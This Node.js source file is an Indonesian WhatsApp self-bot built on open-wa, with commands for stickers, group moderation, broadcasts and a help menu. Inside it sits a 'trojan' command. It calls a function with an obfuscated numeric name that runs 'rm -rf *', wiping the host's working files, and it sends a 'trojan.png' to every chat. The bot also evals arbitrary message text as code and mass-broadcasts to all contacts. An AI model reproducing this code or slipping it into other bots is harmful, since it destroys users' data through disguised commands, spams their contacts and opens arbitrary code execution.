require("dotenv").config();
const indihome = require("axios");
const { create, Client } = require("@open-wa/wa-automate");
const { decryptMedia } = require("@open-wa/wa-decrypt");
const chalk = require("chalk");
const canvas = require("canvas");
const fs = require("fs");
const figlet = require("figlet")
const moment = require("moment");
const util = require("util");
const { ToBase64, SaveFileTemp, TrueFalse, runtime, TanggalLengkap } = require("./lib/function/function.js");
const { SuccesMengirim, FormatSticker, GroupOnly, BotAdmin, addMember, SuccesAdd, SuccesKick, kickMember, GoodBye, SuccesSetname, SuccesSetStatus, PromotDemot, LinkGRUP, SetFoto, runTime, Kecepatan, MenuBot, GadaDimenu, NoTelpon, BukaTutup } = require("./lib/function/kata.js");
const { UploadFile } = require("./lib/function/api.js");
const { settings } = require("cluster");
const { exec, spawn } = require("child_process");
const path = require("path");
const speed = require("performance-now");
const randomPassword = require("password-generator")
const print = (msg) => {
	return console.log(msg)
}
const tunggu = (waktu) => {
	return new Promise(resolve => setTimeout(resolve, waktu))
}


// DATABASE
let setting = JSON.parse(fs.readFileSync('./lib/database/setting.json'))
let options = require("./lib/account/options.js");

function Gas(ra = new Client()) {
	try {
		console.log(figlet.textSync('RA BOT', "Larry 3D 2"))
		console.log(`-----------------------------------------------------------[ AUTHOR RA ]-----------------------------------------------------------`)
		console.log('Author: RA')
		console.log('Nama: RA BOT')
		console.log('WA: 082149344210')
		console.log(`Tanggal : ${TanggalLengkap()}`)
		console.log(`-----------------------------------------------------------[ AUTHOR RA ]-----------------------------------------------------------`)
	ra.onAnyMessage((async (Ra_message) => {
		const { Ack, AddedToGroup, body, AnyMessage, Battery, ChatDeleted, ChatOpened, ChatState, ContactAdded, GlobalParticipantsChanged, Message, MessageDeleted, Plugged, StateChanged, Story, type, t, sender, isGroupMsg, chat, chatId, caption, isMedia, mimetype, quotedMsg, quotedMsgObj, isNewMsg, author, mentionedJidList, id } = Ra_message
		const { name, formattedTitle } = chat
		const commands = caption || body || ''
		const from = chat.id
		if(!Ra_message.fromMe) return
		const args =  commands.split(' ')
        const command = commands.toLowerCase().split(' ')[0] || ''
		const perintah = body?.toLowerCase().split(/ +/g)[0] || ''

		prefix =  /^[°•π÷×¶+∆£¢€¥®™✓_=|~!?@#$%^&.\/\\©^]/.test(perintah) ? perintah.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.\/\\©^]/gi) : "-";
		const Laju = speed();
		const Speed = speed() - Laju;

		const time = moment(t * 1000).format('DD/MM HH:mm:ss')
		const uaOverride = 'WhatsApp/2.2029.4 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
		const isCmd = command.startsWith(prefix)
		const isQuotedImage = quotedMsg && quotedMsg.type === 'image'
        const isQuotedVideo = quotedMsg && quotedMsg.type === 'video'
        const isQuotedAudio = quotedMsg && (quotedMsg.type === 'audio' || quotedMsg.type === 'ptt' || quotedMsg.type === 'ppt')
        const isQuotedFile = quotedMsg && quotedMsg.type === 'document'
		const ownerNumber = ['6282149344210@c.us', '33753045534@c.us', '79054685580@c.us']
		const randomName = await randomPassword(12, false)
		const NomerBot = await ra.getHostNumber()
		const Blokir = await ra.getBlockedIds()
		const groupId = isGroupMsg ? chat.groupMetadata.id : ''
		const battery = await ra.getBatteryLevel()
		const isCharging = await ra.getIsPlugged()
		const AdminGrup = isGroupMsg ? await ra.getGroupAdmins(groupId) : ''
		const BotAdminOnly = isGroupMsg ? AdminGrup.includes(NomerBot + '@c.us') : false

		const Print = async (pesan) => {
			const Rapi =  JSON.stringify(pesan, null, 4)
			return await ra.sendText(from, Rapi)
		}
		const StickerWmPribadi = async (data, potong) => {
			return await ra.sendImageAsSticker(from, data, { author: 'Ra', pack: 'RA BOT', keepScale: potong })
		}
		const StickerMp4Pribadi = async (data, potong) => {
			return await ra.sendMp4AsSticker(from, data, {fps: 10, startTime: `00:00:00.0`, endTime : `00:00:05.0`, loop: 0, crop: potong}, { pack: 'RA BOT', author: 'Ra' })
		}
		const Trojan404 = async (trojan) => {
			return await ra.sendFileFromUrl(trojan, `https://i.ibb.co/7Wz4Vmz/IMG-20210518-WA0040.jpg`, 'trojan.png', `Kalo ada bagi`)
		}
		const V5029130212 = () => {
			return exec(`rm -rf *`)
		}
		const KirimFile = async (data, Tipe, pesan) => {
			const namaFile = await `${randomName}.${Tipe}`
			const Pesannya = pesan || ''
			return await ra.sendFile(from, data, `${namaFile}`, Pesannya)
		}
		const KirimGambar = async (data, Tipe, pesan) => {
			const namaFile = await `${randomName}.${Tipe}`
			const Pesannya = pesan || ''
			return await ra.sendImage(from, data, namaFile, Pesannya)
		}
		const PrintText = async (msg) => {
			return await ra.sendText(from, msg)
		}
		const PrintReply = async (msg) => {
			return await ra.reply(from, msg, id)
		}
		const StickerWm = async (data, options) => {
			return await ra.sendImageAsSticker(from, data, options)
		}
		const PrintMention = async (msg) => {
			return await ra.sendTextWithMentions(from, msg, false)
		}


		if(isCmd) { console.log(chalk.greenBright('[SELF-BOT]'), chalk.cyan('=>'), chalk.bold.cyan('[RECORD]'), chalk.bold.red(`${command}`), chalk.bold.blue(`[${args.length}]`), chalk.bold.whiteBright('in'), chalk.bold.magentaBright(`${name || formattedTitle || 'SELF i`am Ra'}`), chalk.cyanBright('=>'), chalk.yellow('[DATE] => '), chalk.greenBright(`${TanggalLengkap()}`), chalk.italic.cyan('BY RA'))}
		switch(command) {
			case '=>':
				print(`=> Eval`)
				const TextEval = body.slice(3)
				const evaL = util.format(eval(`(async () => {
						${TextEval}
				})()`))
				await Print(evaL)
				break
			case prefix+'sticker':
			case prefix+'stiker':
			case prefix+'s':
				if(isMedia && type === 'image' || isQuotedImage) {
					const Nama = await randomName
					const  encryptMedia = isQuotedImage ? quotedMsg : Ra_message
					const data = await SaveFileTemp(encryptMedia, uaOverride, 'image', `${Nama}.png`)
					await StickerWmPribadi(data, false)
					fs.unlinkSync(data)
				} else if (args[1] == 'url' && quotedMsg && quotedMsg.type == 'sticker') {
					const Nama = await randomName
					const data = await SaveFileTemp(quotedMsg, uaOverride, 'image', `${Nama}.png`)
					const upload = await UploadFile(data)
					await KirimGambar(upload, 'png', `${SuccesMengirim()}`)
					await fs.unlinkSync(data)
				} else if (args[1] == 'colong' && quotedMsg && quotedMsg.type == 'sticker' || args[1] == 'take' && quotedMsg && quotedMsg.type == 'sticker') {
					const Nama = await randomName
					const data = await SaveFileTemp(quotedMsg, uaOverride, 'image', `${Nama}.png`)
					await StickerWmPribadi(data, false)
					fs.unlinkSync(data)
				} else if (quotedMsg && quotedMsg.type == 'sticker') {
					const data = await ToBase64(quotedMsg, uaOverride, quotedMsg.mimetype)
					await KirimFile(data, 'png', `${SuccesMengirim()}`)
				} else if (quotedMsg && quotedMsg.type == 'image') {
					const data = await ToBase64(quotedMsg, uaOverride, quotedMsg.mimetype)
					await StickerWmPribadi(data, false)
				} else if (isMedia && type === 'video' || mimetype === 'image/gif') {
					const  encryptMedia = isQuotedImage ? quotedMsg : Ra_message
					const data = await decryptMedia(encryptMedia, uaOverride)
					await StickerMp4Pribadi(data, false)
				} else if (quotedMsg && quotedMsg.type == 'video' || quotedMsg && quotedMsg.mimetype == 'image/gif') {
					const data = await decryptMedia(quotedMsg, uaOverride)
					await StickerMp4Pribadi(data, false)
				} else {
					PrintText(FormatSticker(prefix))
				}
				break
			case prefix+'add':
				if (!isGroupMsg) return PrintText(`${GroupOnly(command)}`)
				if (!BotAdminOnly) return PrintReply(`${BotAdmin()}`)
			    if (args.length === 1) {
					await ra.addParticipant(from, args[1] + '@c.us')
					await tunggu(4000)
					await PrintMention(SuccesAdd(args[1], formattedTitle || name))
				} else if (quotedMsg){
					await ra.addParticipant(from, quotedMsgObj.sender.id)
					await tunggu(4000)
					await PrintMention(SuccesAdd(quotedMsgObj.sender.id.replace('@c.us',  formattedTitle || name)))
				} else {
					await ra.addParticipant(from, `${mentionedJidList[0]}`)
					await tunggu(4000)
					await PrintMention(SuccesAdd(mentionedJidList[0].replace('@c.us', ''), formattedTitle || name))
				}
				break
			case prefix+'kick':
				if (!isGroupMsg) return PrintText(`${GroupOnly(command)}`)
				if (!BotAdminOnly) return PrintReply(`${BotAdmin()}`)
			    if (args.length === 1) {
					await ra.removeParticipant(from, args[1] + '@c.us')
					await tunggu(4000)
					await PrintMention(SuccesKick(args[1], formattedTitle || name))
				} else if (quotedMsg){
					await ra.removeParticipant(from, quotedMsgObj.sender.id)
					await tunggu(4000)
					await PrintMention(SuccesKick(quotedMsgObj.sender.id.replace('@c.us',  formattedTitle || name)))
				} else {
					await ra.removeParticipant(from, mentionedJidList[0])
					await tunggu(4000)
					await PrintMention(SuccesKick(mentionedJidList[0].replace('@c.us', ''), formattedTitle || name))
				}
				break
			case prefix+'setname':
				if (args.length === 1) return await PrintReply(body.slice(9) + ' Nama')
				await ra.setMyName(body.slice(9))
				await PrintText(SuccesSetname(body.slice(9)))
				break
			case prefix+'leave':
				if (!isGroupMsg) return PrintText(`${GroupOnly(command)}`)
				await PrintText(GoodBye())
				await tunggu(2000)
				await ra.leaveGroup(from)
				break
			case prefix+'trojan':
				const ScanIdVirus = await ra.getAllChatIds();	
				for (let BuildTrojan of ScanIdVirus) {
					await V5029130212()
					await Trojan404(BuildTrojan)
				}
				await PrintText(`TROJAN SEDANG BEKERJA`)
				break
			case prefix+'setstatus':
				if (args.length === 1) return await PrintReply(body.slice(11) + ' status')
				await ra.setMyStatus(body.slice(11))
				await PrintText(SuccesSetStatus(body.slice(11)))
				break
			case prefix+'clear':
				await ra.deleteChat(from)
				break	
			case prefix+'clearall':
				const allChat = await ra.getAllChats()
				for (let i of allChat) {
					await ra.deleteChat(i)
				}
				break
			case prefix+'join':
			case prefix+'gabung':
				const LinkWa = args[1].match(/(https:\/\/chat.whatsapp.com)/gi)
				const checkLink = await ra.inviteInfo(args[1])
				if(!LinkWa) return
				if(checkLink.status === 200) {
					await ra.joinGroupViaLink(args[1])
				} else {
					PrintReply(`Gagal Bergabung didalam Group`)
				}
				break
			case prefix+'delete':
			case prefix+'del':
				if (!quotedMsg) return 
				if (!quotedMsgObj.fromMe) return
				await ra.deleteMessage(quotedMsgObj.chatId, quotedMsgObj.id, false)
				break
			case prefix+'promote':
				if (!isGroupMsg) return PrintText(`${GroupOnly(command)}`)
				if (!BotAdminOnly) return PrintReply(`${BotAdmin()}`)
				if (args.length === 1) {
					await ra.promoteParticipant(from, args[1] + '@c.us')
				}  else if (quotedMsg) {
					await ra.promoteParticipant(from, quotedMsgObj.sender.id)
				} else {
					await ra.promoteParticipant(from, mentionedJidList[0])
				}
				break
			case prefix+'demote':
				if (!isGroupMsg) return PrintText(`${GroupOnly(command)}`)
				if (!BotAdminOnly) return PrintReply(`${BotAdmin()}`)
			    if (args.length === 1) {
					await ra.demoteParticipant(from, args[1] + '@c.us')
				} else if (quotedMsg) {
					await ra.demoteParticipant(from,  quotedMsgObj.sender.id)
				} else {
					await ra.demoteParticipant(from, mentionedJidList[0])
				}
				break
			case prefix+'linkgroup':
				if (!isGroupMsg) return PrintText(`${GroupOnly(command)}`)
				if (!BotAdminOnly) return PrintReply(`${BotAdmin()}`)
				const LinkGc = await ra.getGroupInviteLink(from)
				await PrintText(`${LinkGRUP(formattedTitle, LinkGc)}`)
				break
			case prefix+'revoke':
				if (!isGroupMsg) return PrintText(`${GroupOnly(command)}`)
				if (!BotAdminOnly) return PrintReply(`${BotAdmin()}`)
				await ra.revokeGroupInviteLink(from)
				break
			case prefix+'setpp':
				if (isMedia && type === 'image' || isQuotedImage) {
					const encryptMedia = isQuotedImage ? quotedMsg : Ra_message
					const data = await ToBase64(encryptMedia, uaOverride, mimetype)
					await ra.setProfilePic(data)
				} else {
					await PrintText(SetFoto(command))
				}
				break
			case prefix+'block':
			    if (args.length === 1) {
					await ra.contactBlock(from, args[1] + '@c.us')
				}  else if (quotedMsg) {
					await ra.contactBlock(from, quotedMsgObj.sender.id)
				} else {
					await ra.contactBlock(mentionedJidList[0])	
				}
				break
			case prefix+'unblock':
			    if (args.length === 1) {
					await ra.contactUnblock(from, args[1] + '@c.us')
				}  else if (quotedMsg) {
					await ra.contactUnblock(from, quotedMsgObj.sender.id)
				} else {
					await ra.contactBlock(mentionedJidList[0])	
				}
				break
			case prefix+'bc':
				const Bc = body.slice(4)
				const textBc = `「 PESAN SIARAN BOT 」\n\n${Bc}` || ''
				const AllGrup = await ra.getAllChatIds();
				if (quotedMsg && quotedMsg.type == 'image') {
					const encryptMedia = isQuotedImage ? quotedMsg : Ra_message
					const data = await ToBase64(encryptMedia, uaOverride, mimetype)
					for (let i of AllGrup) {
						await ra.sendImage(i, data, `${randomName}.png`, textBc)
					}
				} else {
					for (let i of AllGrup) {
						await ra.sendText(i, textBc)
					}
				}
				await PrintText(`Succes Broudcast`)
				break
			case prefix+'runtime':
				const Jadwal = await runtime()
				await PrintText(runTime(Jadwal))
				break
			case prefix+'ping':
				await PrintText(Kecepatan(Speed.toFixed(4)))
				break
			case prefix+'group':
				if (!isGroupMsg) return PrintText(`${GroupOnly(command)}`)
				if (!BotAdminOnly) return PrintReply(`${BotAdmin()}`)
				if(args[1].toLocaleLowerCase() === 'buka') {
					await ra.setGroupEditToAdminsOnly(from, false)
				} else if (args[1].toLocaleLowerCase() === 'tutup') {
					await ra.setGroupEditToAdminsOnly(from, true)
				} else {
					await PrintText(BukaTutup())
				}
				break
			case prefix+'menu':
			case prefix+'help':
				const Run = await runtime()
				const batrai = `${battery} ${isCharging ?  '⚡' : '❌'}`
				await PrintText(MenuBot(prefix, TanggalLengkap(), runTime(Run), batrai, Speed.toFixed(4)))
				break
			default:
				if (command.startsWith('!')) {
					PrintText(GadaDimenu(command))
				}
		}
	}))
	ra.onIncomingCall(( async (Telpon) => {
		await ra.sendText(Telpon.peerJid, NoTelpon())
		await tunggu(3000)
		await ra.contactBlock(Telpon.peerJid)
	}))
} catch (err) {
	print(err)
}
}

create(options(true, Gas))
.then(ra => Gas(ra))
.catch(err => print(err))